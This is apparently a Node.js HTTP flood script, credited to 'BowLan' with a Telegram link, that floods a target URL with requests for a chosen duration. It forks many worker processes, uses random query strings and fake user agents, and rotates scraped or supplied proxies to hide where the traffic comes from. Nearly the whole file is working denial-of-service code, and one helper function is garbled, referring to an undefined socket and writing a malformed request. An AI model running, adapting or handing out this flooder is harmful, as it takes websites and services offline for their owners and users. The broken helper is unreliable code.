/**
HTTP Flood ~~ Method & Edit | BowLan
Telegram: https://t.me/Bowlan/
*/ 

require('events').EventEmitter.defaultMaxListeners = 0;
const request = require('request')
axios = require("axios"),
    fs = require('fs'),
    fakeUa = require('fake-useragent');
cluster = require('cluster');

function randstr(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * 
 charactersLength));
   }
   return result;
}

async function poptto() {
    if (process.argv.length !== 6) {
        console.log("node file_name.js url times threads proxy / off / proxy.txt");
        process.exit(0);
    } else {
        const target = process.argv[2];
        const times = process.argv[3];
        const threads = process.argv[4];
        Array.prototype.remove_by_value = function(val) {
            for (var i = 0; i < this.length; i++) {
                if (this[i] === val) {
                    this.splice(i, 1);
                    i--;
                }
                client.on('data', function() {
                    setTimeout(function() {
                        client.destroy();
                        return delete client;
                    }, 5000);
                });
                for (let i = 0; i < threads; ++i) {
                    client.write(`
                    GET ${
                        target
                    } ${randstr(10)} + '//?' + ${randstr(20)}
                    HTTP / 1.1 +
                    headers
                    `)
                }
            }
            return this;
        }
        if (process.argv[5] == 'off') {
            console.log("OFF")
        } else if (process.argv[5] == 'proxy') {
            console.log("PROXY")
            const proxyscrape_http = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
            var proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n');
        } else {
            console.log("PROXY")
            var proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/g, '').split('\n');
        }

        function run() {
            if (process.argv[5] !== 'off') {
                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var proxiedRequest = request.defaults({
                    'proxy': 'http://' + proxy
                });
                var config = {
                    method: 'get',
                    url: target + '//?' + randstr(15),
                    headers: {
						'Referer': 'https://www.google.com/',
						'Accept-encoding': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'Cache-Control': 'no-cache',
                        'User-Agent': fakeUa()
                    }
                };
                proxiedRequest(config, function(error, response) {
                    console.log(response.statusCode, response.statusMessage)
                    if (proxies.length == 0) {
                        process.exit(0);
                    }
                    if (response.statusCode >= 200 && response.statusCode <= 226) {
                        for (let index = 0; index < 1000; index++) {
                            proxiedRequest(config);
                        }
                    } else {
                        proxies = proxies.remove_by_value(proxy)
                    }
                });
            } else {
                var config = {
                    method: 'get',
                    url: target + '//?' + randstr(15),
                    headers: {
                        'Referer': 'https://www.google.com/',
						'Accept-encoding': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'Cache-Control': 'no-cache',
						'Upgrade-Insecure-Requests': '1',
                        'User-Agent': fakeUa()
                    }
                };
                request(config, function(error, response) {
                    console.log(response.statusCode, response.statusMessage)
                });
            }
        }

        function thread() {
            setInterval(() => {
                run();
            });
        }
        async function main() {
            if (cluster.isMaster) {
                for (let i = 0; i < threads; i++) {
                    cluster.fork();
                }
                cluster.on('exit', function() {
                    cluster.fork();
                });
            } else {
                thread();
            }
        }
        main();
        setTimeout(() => {
            console.log('Attack ended.');
            process.exit(0)
        }, times * 1000);
    }
}
process.on('uncaughtException', function(err) {});
process.on('unhandledRejection', function(err) {});
poptto();